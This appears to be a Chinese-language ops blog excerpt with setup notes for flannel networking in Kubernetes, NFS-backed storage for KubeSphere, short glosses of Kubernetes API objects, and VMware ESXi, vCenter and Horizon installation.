rbac.authorization.k8s.io/v1metadata:  name: flannelroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: flannelsubjects:- kind: ServiceAccount  name: flannel  namespace: kube-system---apiVersion: v1kind: ServiceAccountmetadata:  name: flannel  namespace: kube-system---kind: ConfigMapapiVersion: v1metadata:  name: kube-flannel-cfg  namespace: kube-system  labels:    tier: node    app: flanneldata:  cni-conf.json: |    &#123;      <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cbr0&quot;</span>,      <span class="hljs-string">&quot;cniVersion&quot;</span>: <span class="hljs-string">&quot;0.3.1&quot;</span>,      <span class="hljs-string">&quot;plugins&quot;</span>: [        &#123;          <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;flannel&quot;</span>,          <span class="hljs-string">&quot;delegate&quot;</span>: &#123;            <span class="hljs-string">&quot;hairpinMode&quot;</span>: <span class="hljs-literal">true</span>,            <span class="hljs-string">&quot;isDefaultGateway&quot;</span>: <span class="hljs-literal">true</span>          &#125;        &#125;,        &#123;          <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;portmap&quot;</span>,          <span class="hljs-string">&quot;capabilities&quot;</span>: &#123;            <span class="hljs-string">&quot;portMappings&quot;</span>: <span class="hljs-literal">true</span>          &#125;        &#125;      ]    &#125;  net-conf.json: |    &#123;      <span class="hljs-string">&quot;Network&quot;</span>: <span class="hljs-string">&quot;10.244.0.0/16&quot;</span>,      <span class="hljs-string">&quot;Backend&quot;</span>: &#123;        <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;vxlan&quot;</span>      &#125;    &#125;---apiVersion: apps/v1kind: DaemonSetmetadata:  name: kube-flannel-ds  namespace: kube-system  labels:    tier: node    app: flannelspec:  selector:    matchLabels:      app: flannel  template:    metadata:      labels:        tier: node        app: flannel    spec:      affinity:        nodeAffinity:          requiredDuringSchedulingIgnoredDuringExecution:            nodeSelectorTerms:            - matchExpressions:              - key: kubernetes.io/os                operator: In                values:                - linux      hostNetwork: <span class="hljs-literal">true</span>      priorityClassName: system-node-critical      tolerations:      - operator: Exists        effect: NoSchedule      serviceAccountName: flannel      initContainers:      - name: install-cni        image: quay.io/coreos/flannel:v0.14.0        <span class="hljs-built_in">command</span>:        - <span class="hljs-built_in">cp</span>        args:        - -f        - /etc/kube-flannel/cni-conf.json        - /etc/cni/net.d/10-flannel.conflist        volumeMounts:        - name: cni          mountPath: /etc/cni/net.d        - name: flannel-cfg          mountPath: /etc/kube-flannel/      containers:      - name: kube-flannel        image: quay.io/coreos/flannel:v0.14.0        <span class="hljs-built_in">command</span>:        - /opt/bin/flanneld        args:        - --ip-masq        - --kube-subnet-mgr        resources:          requests:            cpu: <span class="hljs-string">&quot;100m&quot;</span>            memory: <span class="hljs-string">&quot;50Mi&quot;</span>          limits:            cpu: <span class="hljs-string">&quot;100m&quot;</span>            memory: <span class="hljs-string">&quot;50Mi&quot;</span>        securityContext:          privileged: <span class="hljs-literal">false</span>          capabilities:            add: [<span class="hljs-string">&quot;NET_ADMIN&quot;</span>, <span class="hljs-string">&quot;NET_RAW&quot;</span>]        <span class="hljs-built_in">env</span>:        - name: POD_NAME          valueFrom:            fieldRef:              fieldPath: metadata.name        - name: POD_NAMESPACE          valueFrom:            fieldRef:              fieldPath: metadata.namespace        volumeMounts:        - name: run          mountPath: /run/flannel        - name: flannel-cfg          mountPath: /etc/kube-flannel/      volumes:      - name: run        hostPath:          path: /run/flannel      - name: cni        hostPath:          path: /etc/cni/net.d      - name: flannel-cfg        configMap:          name: kube-flannel-cfg</code></pre><ol><li>查看节点状态，状态必须为ready</li></ol><pre><code class="hljs shell">kubectl get nodeslanguage-shell复制代码</code></pre><ol><li>查看加入集群的命令</li></ol><pre><code class="hljs shell">kubeadm token create --print-join-commandlanguage-shell复制代码</code></pre><h1 id="12-node加入集群"><a href="#12-node加入集群" class="headerlink" title="12.node加入集群"></a>12.node加入集群</h1><pre><code class="hljs shell">kubeadm join 192.168.18.200:6443 --token opip9p.rh35kkvqzwjizely --discovery-token-ca-cert-hash sha256:9252e13d2ffd3569c40b02c477f59038fac39aade9e99f282a333c0f8c5d7b22language-shell复制代码</code></pre><h1 id="13-测试"><a href="#13-测试" class="headerlink" title="13.测试"></a>13.测试</h1><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">https://raw.githubusercontent.com/kubernetes/website/master/content/en/examples/application/nginx-app.yaml需要科学上网才能访问，</span><span class="hljs-meta prompt_"># </span><span class="language-bash">可在你的电脑访问后，在master服务器上创建nginx-app.yaml后，粘贴进去。</span>kubectl apply -f https://raw.githubusercontent.com/kubernetes/website/master/content/en/examples/application/nginx-app.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">执行如下命令查看副本（pod）情况</span>kubectl get pods -o wide<span class="hljs-meta prompt_"># </span><span class="language-bash">执行如下命令则可以查看 services 状态。</span>kubectl get servicelanguage-shell复制代码</code></pre><hr><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><ol><li>标题1，2，3 文档：<a href="https://segmentfault.com/a/1190000037682150">参考连接</a></li><li>标题4，5 文档 <a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">参考连接</a></li><li>标题6，7，10 文档 <a href="https://www.ihawo.com/archives/139.html">参考连接</a></li><li>标题8，10 文档 <a href="https://blog.csdn.net/styshoo/article/details/55657714">参考连接</a></li></ol><h1 id="部署KubeSphere"><a href="#部署KubeSphere" class="headerlink" title="部署KubeSphere"></a>部署KubeSphere</h1><h2 id="1-设置默认存储类型"><a href="#1-设置默认存储类型" class="headerlink" title="1. 设置默认存储类型"></a>1. 设置默认存储类型</h2><h3 id="1-1-安装nfs"><a href="#1-1-安装nfs" class="headerlink" title="1.1 安装nfs"></a>1.1 安装nfs</h3><ol><li>创建共享目录</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /data/kubernetes复制代码</code></pre><ol><li>xxxxxxxxxx 前因后果状态。bash</li></ol><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nfs-utils rpcbind复制代码</code></pre><ol><li>编辑配置文件</li></ol><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>exports复制代码</code></pre><ol><li>内容如下：</li></ol><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/kubernetes 192.168.31.0/24(<span class="hljs-title">rw</span>,<span class="hljs-title">sync</span>,<span class="hljs-title">no_root_squash</span>)</span>复制代码</code></pre><p>注意：这里的192.168.31.0&#x2F;24，表示客户端访问白名单。只有符合的ip，才能访问。</p><ol><li>启动nfs服务</li></ol><pre><code class="hljs crmsh">service nfs <span class="hljs-literal">start</span>service rpcbind <span class="hljs-literal">start</span>复制代码</code></pre><ol><li>设置开机自启动</li></ol><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> nfssystemctl <span class="hljs-built_in">enable</span> rpcbind复制代码</code></pre><ol><li>登录<strong>主机k8s-master</strong>，安装客户端组件</li></ol><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nfs-utils rpcbind复制代码</code></pre><ol><li>测试nfs</li></ol><pre><code class="hljs nginx"><span class="hljs-comment">## showmount -e 192.168.31.179</span><span class="hljs-attribute">Export</span> list for <span class="hljs-number">192.168.31.179</span>:/data/kubernetes <span class="hljs-number">192.168.31.0</span>/<span class="hljs-number">24</span>复制代码</code></pre><h2 id="1-2-安装-StorageClass"><a href="#1-2-安装-StorageClass" class="headerlink" title="1.2 安装 StorageClass"></a>1.2 安装 StorageClass</h2><ol><li>登录<strong>主机k8s-master</strong>，创建目录</li></ol><pre><code class="hljs arduino">mkdir nfsvolume复制代码</code></pre><ol><li>下载yaml文件</li></ol><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/kubernetes-incubator/</span>external-storage<span class="hljs-regexp">/master/</span>nfs-client<span class="hljs-regexp">/deploy/</span>rbac.yamlhttps:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/kubernetes-incubator/</span>external-storage<span class="hljs-regexp">/master/</span>nfs-client<span class="hljs-regexp">/deploy/</span>class.yamlhttps:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/kubernetes-incubator/</span>external-storage<span class="hljs-regexp">/master/</span>nfs-client<span class="hljs-regexp">/deploy/</span>deployment.yaml复制代码</code></pre><ol><li>修改 deployment.yaml 中的两处 NFS 服务器 IP 和目录</li></ol><pre><code class="hljs nix">...          <span class="hljs-params">env:</span>            <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> PROVISIONER_NAME              <span class="hljs-params">value:</span> fuseim.pri<span class="hljs-symbol">/ifs</span>            <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> NFS_SERVER              <span class="hljs-params">value:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">31.179</span>            <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> NFS_PATH              <span class="hljs-params">value:</span> <span class="hljs-symbol">/data/kubernetes</span>      <span class="hljs-params">volumes:</span>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nfs-client-root          <span class="hljs-params">nfs:</span>            <span class="hljs-params">server:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">31.179</span>            <span class="hljs-params">path:</span> <span class="hljs-symbol">/data/kubernetes</span>复制代码</code></pre><h3 id="1-3-部署创建"><a href="#1-3-部署创建" class="headerlink" title="1.3 部署创建"></a>1.3 部署创建</h3><ol><li>具体的说明可以去官网查看</li></ol><pre><code class="hljs oxygene">kubectl <span class="hljs-keyword">create</span> -f rbac.yamlkubectl <span class="hljs-keyword">create</span> -f <span class="hljs-keyword">class</span>.yamlkubectl <span class="hljs-keyword">create</span> -f deployment.yaml复制代码</code></pre><ol><li>注意：请确保每一个k8s node节点，安装了nfs-utils</li></ol><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nfs-utils复制代码</code></pre><ol><li>查看storageclass</li></ol><pre><code class="hljs kotlin">## kubectl <span class="hljs-keyword">get</span> storage<span class="hljs-keyword">class</span><span class="hljs-title class_">NAME</span>                            <span class="hljs-title">PROVISIONER</span>      <span class="hljs-title">AGE</span>managed-nfs-storage    fuseim.pri/ifs   139m复制代码</code></pre><ol><li>查看nfs pod</li></ol><pre><code class="hljs axapta"><span class="hljs-meta">## kubectl get pods</span>NAME                                      READY   STATUS    RESTARTS   AGEnfs-<span class="hljs-keyword">client</span>-provisioner<span class="hljs-number">-59777</span>fb457-dkf87   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">153</span>m复制代码</code></pre><ol><li>标记一个默认的 StorageClass</li></ol><pre><code class="hljs jboss-cli">kubectl <span class="hljs-keyword">patch</span> storageclass managed-nfs-storage -p &#x27;&#123;<span class="hljs-string">&quot;metadata&quot;</span>: &#123;<span class="hljs-string">&quot;annotations&quot;</span>:&#123;<span class="hljs-string">&quot;storageclass.kubernetes.io/is-default-class&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;&#125;&#125;&#x27;复制代码</code></pre><ol><li>验证标记是否成功</li></ol><pre><code class="hljs pgsql">## kubectl <span class="hljs-keyword">get</span> storageclass<span class="hljs-type">NAME</span>                            PROVISIONER      AGEmanaged-nfs-<span class="hljs-keyword">storage</span> (<span class="hljs-keyword">default</span>)   fuseim.pri/ifs   <span class="hljs-number">139</span>m复制代码</code></pre><p>出现了一个default，表示成功了。</p><h2 id="2-安装KubeSphere"><a href="#2-安装KubeSphere" class="headerlink" title="2. 安装KubeSphere"></a>2. 安装KubeSphere</h2><h3 id="参考管访问当"><a href="#参考管访问当" class="headerlink" title="参考管访问当"></a>参考管访问当</h3><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol><li>标题1参考文章: <a href="https://cloud.tencent.com/developer/article/1677566">文章连接</a></li></ol><h1 id="K8s的API对象"><a href="#K8s的API对象" class="headerlink" title="K8s的API对象"></a>K8s的API对象</h1><h3 id="1-Namespace"><a href="#1-Namespace" class="headerlink" title="1. Namespace"></a>1. Namespace</h3><p>命名空间实现同一集群上的资源隔离</p><h3 id="2-Pod"><a href="#2-Pod" class="headerlink" title="2. Pod"></a>2. Pod</h3><p>K8s的最小运行单元</p><h3 id="3-ReplicaSet"><a href="#3-ReplicaSet" class="headerlink" title="3. ReplicaSet"></a>3. ReplicaSet</h3><p>实现pod平滑迭代更新及回滚用，这个不需要我们实际操作</p><h3 id="4-Deployment"><a href="#4-Deployment" class="headerlink" title="4. Deployment"></a>4. Deployment</h3><p>用来发布无状态应用</p><h3 id="5-Health-Check"><a href="#5-Health-Check" class="headerlink" title="5. Health Check"></a>5. Health Check</h3><p>服务健康状态检测</p><p>实现的需求：</p><ol><li>零停机部署</li><li>避免部署无效的服务镜像</li><li>更加安全地滚动升级</li></ol><p>不同点：</p><ol><li>不同之处在于检测失败后的行为：Liveness 检测是重启容器；Readiness 检测则是将容器设置为不可用，不接收 Service 转发的请求。</li><li>用 Liveness 检测判断容器是否需要重启以实现自愈；用 Readiness 检测判断容器是否已经准备好对外提供服务。</li><li>Health Check 在 业务生产中滚动更新（rolling update）的应用场景</li></ol><h3 id="6-Service-Endpoint"><a href="#6-Service-Endpoint" class="headerlink" title="6. Service,Endpoint"></a>6. Service,Endpoint</h3><p>实现同一lables下的多个pod流量负载均衡</p><h3 id="7-Labels"><a href="#7-Labels" class="headerlink" title="7. Labels"></a>7. Labels</h3><p>标签，服务间选择访问的重要依据</p><h3 id="8-Ingress"><a href="#8-Ingress" class="headerlink" title="8. Ingress"></a>8. Ingress</h3><p>K8s的流量入口</p><h3 id="9-DaemonSet"><a href="#9-DaemonSet" class="headerlink" title="9. DaemonSet"></a>9. DaemonSet</h3><p>用来发布守护应用，例如我们部署的CNI插件</p><h3 id="10-HPA"><a href="#10-HPA" class="headerlink" title="10. HPA"></a>10. HPA</h3><p>Horizontal Pod Autoscaling自动水平伸缩</p><h3 id="11-Volume"><a href="#11-Volume" class="headerlink" title="11. Volume"></a>11. Volume</h3><p>存储卷</p><h3 id="12-Pv-pvc-StorageClass"><a href="#12-Pv-pvc-StorageClass" class="headerlink" title="12. Pv, pvc, StorageClass"></a>12. Pv, pvc, StorageClass</h3><p>持久化存储，持久化存储声明，动态存储pv</p><h3 id="13-StatefulSet"><a href="#13-StatefulSet" class="headerlink" title="13. StatefulSet"></a>13. StatefulSet</h3><p>用来发布有状态应用</p><h3 id="14-Job-CronJob"><a href="#14-Job-CronJob" class="headerlink" title="14. Job,CronJob"></a>14. Job,CronJob</h3><p>一次性任务及定时任务</p><h3 id="15-Configmap-serect"><a href="#15-Configmap-serect" class="headerlink" title="15. Configmap, serect"></a>15. Configmap, serect</h3><p>服务配置及服务加密配置</p><h3 id="16-Kube-proxy"><a href="#16-Kube-proxy" class="headerlink" title="16. Kube-proxy"></a>16. Kube-proxy</h3><p>提供service服务流量转发的功能支持，这个不需要我们实际操作</p><h3 id="17-RBAC"><a href="#17-RBAC" class="headerlink" title="17. RBAC"></a>17. RBAC</h3><p>serviceAccount, role, rolebindings, clusterrole, clusterrolebindings基于角色的访问控制</p><h3 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h3><p>K8s事件流，可以用来监控相关事件用，这个不需要我们实际操作。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VMware</title>
      <link href="/2021/09/09/VMware/"/>
      <url>/2021/09/09/VMware/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="VMware挂载虚拟硬盘"><a href="#VMware挂载虚拟硬盘" class="headerlink" title="VMware挂载虚拟硬盘"></a>VMware挂载虚拟硬盘</h2><p>Linux磁盘分区、格式化、目录挂载<a href="https://www.cnblogs.com/jyzhao/p/4778657.html">参考链接</a></p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">根据帮助提醒分区，这里是把/dev/xvdb分成一个区</span>fdisk /dev/sdb<span class="hljs-meta prompt_"># </span><span class="language-bash">依次输入 n 1 p w</span><span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">磁盘格式化，分区为ext4的文件系统格式</span>mkfs.ext4 /dev/sdb1<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">手工挂载</span>mkdir /nfs_dirmount /dev/xvdb1 /nfs_dir<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">开机自动挂载</span>vi /etc/fstablanguage-shell</code></pre><hr><h1 id="ESXI"><a href="#ESXI" class="headerlink" title="ESXI"></a>ESXI</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224148.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224320.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224521.png" alt="img"></p><h3 id="按-Enter-继续安装"><a href="#按-Enter-继续安装" class="headerlink" title="按 Enter 继续安装"></a>按 Enter 继续安装</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224705.png" alt="img"></p><h3 id="按-F11-接受许可"><a href="#按-F11-接受许可" class="headerlink" title="按 F11 接受许可"></a>按 F11 接受许可</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225551.png" alt="img"></p><h3 id="按-Enter-选择硬盘"><a href="#按-Enter-选择硬盘" class="headerlink" title="按 Enter 选择硬盘"></a>按 Enter 选择硬盘</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225341.png" alt="img"></p><h3 id="按-Enter-重启"><a href="#按-Enter-重启" class="headerlink" title="按 Enter 重启"></a>按 Enter 重启</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225745.png" alt="img"></p><h3 id="选择-OS"><a href="#选择-OS" class="headerlink" title="选择 OS"></a>选择 OS</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225912.png" alt="img"></p><h3 id="输入管理员密码"><a href="#输入管理员密码" class="headerlink" title="输入管理员密码"></a>输入管理员密码</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230033.png" alt="img"></p><h3 id="选择-F11-Install"><a href="#选择-F11-Install" class="headerlink" title="选择 F11 Install"></a>选择 F11 Install</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230241.png" alt="img"></p><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230445.png" alt="img"></p><h3 id="管理员登录"><a href="#管理员登录" class="headerlink" title="管理员登录"></a>管理员登录</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230753.png" alt="img"></p><h3 id="选择修改管理网络"><a href="#选择修改管理网络" class="headerlink" title="选择修改管理网络"></a>选择修改管理网络</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230951.png" alt="img"></p><h3 id="打开网络设备"><a href="#打开网络设备" class="headerlink" title="打开网络设备"></a>打开网络设备</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222231317.png" alt="img"></p><h3 id="选择管理口"><a href="#选择管理口" class="headerlink" title="选择管理口"></a>选择管理口</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222231628.png" alt="img"></p><h3 id="选择-IPv4"><a href="#选择-IPv4" class="headerlink" title="选择 IPv4"></a>选择 IPv4</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222231733.png" alt="img"></p><h3 id="设置静态-IP"><a href="#设置静态-IP" class="headerlink" title="设置静态 IP"></a>设置静态 IP</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222232011.png" alt="img"></p><p>ESC 退出和保存配置，就可以使用浏览器通过 IP 地址访问 ESXI 了</p><p>网卡直通</p><p>过滤出可直通的设备，选择除管理网卡外的网络直通</p><hr><h1 id="vCenter"><a href="#vCenter" class="headerlink" title="vCenter"></a>vCenter</h1><pre><code class="hljs bash"><span class="hljs-comment"># 前提条件1: 安装 AD，配置 DNS 解析</span><span class="hljs-comment"># 前提条件2: 安装好一台 ESXI</span><span class="hljs-comment"># 再开始安装 vCenter</span></code></pre><h2 id="AD-DNS安装"><a href="#AD-DNS安装" class="headerlink" title="AD&amp;DNS安装"></a>AD&amp;DNS安装</h2><pre><code class="hljs bash"><span class="hljs-comment"># 2c4G50G, 2019版本, 静态IP(配置DNS), 修改主机名, 关闭防火墙, 开启远程, 安装VMware Tools, 添加AD角色(AD), 将此服务器升为域控器(新林,密码)</span><span class="hljs-comment"># DNS管理器: 右键反向查找区域&gt;新建区域(默认,网络:网段); 正向查找区域&gt;domain.cn&gt;右键新建主机(名称:esxi01, ip地址,勾选PTR)</span></code></pre><h3 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251007223212416.png" alt="新建反向查找区域"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007223523708.png" alt="添加DNS解析"></p><h2 id="vCenter安装"><a href="#vCenter安装" class="headerlink" title="vCenter安装"></a>vCenter安装</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><pre><code class="hljs bash"><span class="hljs-comment"># 导入许可: </span><span class="hljs-comment"># 对接AD: </span><span class="hljs-comment"># ESXI主机设置时间: 配置&gt;系统&gt;时间配置&gt;添加服务&gt;网络时间协议, 添加NTP服务器IP地址</span><span class="hljs-comment"># vCenter主机设置时间: 登录vcsa:5480 web管理页面&gt;时间&gt;时间同步&gt;编辑&gt;NTP,添加NTP服务器IP地址</span><span class="hljs-comment"># 新建数据中心: </span><span class="hljs-comment"># 新建集群: </span><span class="hljs-comment"># 添加主机:</span><span class="hljs-comment"># 创建共享存储: 在windowsServer上创建iscsi共享存储, 在相应esxi主机上添加iscsi的适配器，选择适配器添加iscsi存储</span><span class="hljs-comment"># </span></code></pre><h3 id="导入许可"><a href="#导入许可" class="headerlink" title="导入许可"></a>导入许可</h3><pre><code class="hljs bash"><span class="hljs-comment"># 添加许可，在资产中分配给vCenter和主机</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007224926418.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007225119066.png"></p><h3 id="对接AD"><a href="#对接AD" class="headerlink" title="对接AD"></a>对接AD</h3><pre><code class="hljs bash"><span class="hljs-comment"># 对接AD: 系统管理&gt;Single Sign On&gt;配置&gt;标识源&gt;LDAP&gt;(标识源名称: domain; 用户/组继承标识名: dc=domain,dc=cn, 域名: domain.cn; 主服务器url: ldap://ip)</span><span class="hljs-comment"># 注意: 用户名是域名不戴cn，对接完需要添加AD域控的用户角色。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007225351485.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234642328.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234724956.png"></p><h3 id="NTP配置"><a href="#NTP配置" class="headerlink" title="NTP配置"></a>NTP配置</h3><pre><code class="hljs bash"><span class="hljs-comment"># 在ESXI和vCenter的时区和NTP地址</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007225835628.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007230514291.png"></p><h3 id="设置密码永不过期"><a href="#设置密码永不过期" class="headerlink" title="设置密码永不过期"></a>设置密码永不过期</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251008174207060.png"></p><h3 id="新建数据中心"><a href="#新建数据中心" class="headerlink" title="新建数据中心"></a>新建数据中心</h3><pre><code class="hljs bash"><span class="hljs-comment"># 数据中心往往同一个物理地址创建一个即可</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007230731558.png"></p><h3 id="新建集群"><a href="#新建集群" class="headerlink" title="新建集群"></a>新建集群</h3><pre><code class="hljs bash"><span class="hljs-comment"># 可以有多个集群做业务区分</span></code></pre><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251007230826460.png" alt="image-20251007230826460"></p><h3 id="添加主机"><a href="#添加主机" class="headerlink" title="添加主机"></a>添加主机</h3><h3 id="共享存储"><a href="#共享存储" class="headerlink" title="共享存储"></a>共享存储</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装iSCSI: 添加服务器角色&gt;文件和存储服务&gt;iSCSI, 创建iscsi目录, 新建iSCSI虚拟磁盘, 添加访问服务器IP地址。</span><span class="hljs-comment"># 配置VMFS: esxi添加iSCSI适配器, </span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007224618958.png"></p><h2 id="维护"><a href="#维护" class="headerlink" title="维护"></a>维护</h2><pre><code class="hljs bash"><span class="hljs-comment"># 扩容内存等需求: 将esxi进入维护模式，再关机。</span></code></pre><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><pre><code class="hljs bash"><span class="hljs-comment"># 标准交换机: 管理平面, </span><span class="hljs-comment"># 分布式交换机: 业务平面, 上行链路（是每个esxi主机业务平面的上行链路上限）</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007231403484.png"></p><h3 id="用户-角色-资源"><a href="#用户-角色-资源" class="headerlink" title="用户&amp;角色&amp;资源"></a>用户&amp;角色&amp;资源</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007231456043.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007231547466.png"></p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><pre><code class="hljs bash"><span class="hljs-comment"># 快照时间不要超过24小时，快照数量不要超过3个</span></code></pre><h3 id="虚拟机迁移"><a href="#虚拟机迁移" class="headerlink" title="虚拟机迁移"></a>虚拟机迁移</h3><pre><code class="hljs bash"><span class="hljs-comment"># VMkernel网络适配器&gt;可用服务(管理)</span></code></pre><h3 id="虚拟机自定义规范"><a href="#虚拟机自定义规范" class="headerlink" title="虚拟机自定义规范"></a>虚拟机自定义规范</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234203013.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234229788.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234254012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234310856.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234341080.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234403961.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234420684.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234437015.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234450471.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234506459.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007234523927.png"></p><hr><h1 id="SVC"><a href="#SVC" class="headerlink" title="SVC"></a>SVC</h1><pre><code class="hljs bash"><span class="hljs-comment">## 虚拟化远程桌面</span><span class="hljs-comment"># 服务端: WindowsServer2019, 关闭防火墙, 静态IP, 修改主机名(vdi/svc), 加入AD域, 安装VMwareTools, 安装VMware-Horizon-Connection-Server(重要), 对接vCenter和AD, 导入许可, 创建桌面配置(重要)。</span><span class="hljs-comment"># 客户端: Windows10, 网络DHCP, 开启远程, 安装VMwareTools, 安装agent(重要)。</span><span class="hljs-comment"># 备注: 建议使用共享存储(VMFS:iscsi, NFS)等，这样主机可以跨esxi迁移。</span></code></pre><h2 id="服务端-WindowsServer"><a href="#服务端-WindowsServer" class="headerlink" title="服务端: WindowsServer"></a>服务端: WindowsServer</h2><pre><code class="hljs bash"><span class="hljs-comment"># 4c8G50G, 2019, 静态IP(配置DNS), 修改主机名svc, 加入域, 安装VMware Tools, 关闭防火墙, 开启远程, </span></code></pre><h2 id="服务端-Horizon-Connection-Server"><a href="#服务端-Horizon-Connection-Server" class="headerlink" title="服务端: Horizon-Connection-Server"></a>服务端: Horizon-Connection-Server</h2><pre><code class="hljs bash"><span class="hljs-comment"># 在svc主机上安装VMware-Horizon-Connection-Server(双击安装,不配置windows防火墙,授权特定域或者组,不加入体验计划)</span></code></pre><h2 id="客户端-Windows"><a href="#客户端-Windows" class="headerlink" title="客户端: Windows"></a>客户端: Windows</h2><pre><code class="hljs bash"><span class="hljs-comment"># 制作windows被远程端的模版: DHCP, 关闭防火墙, 不挂载iso, 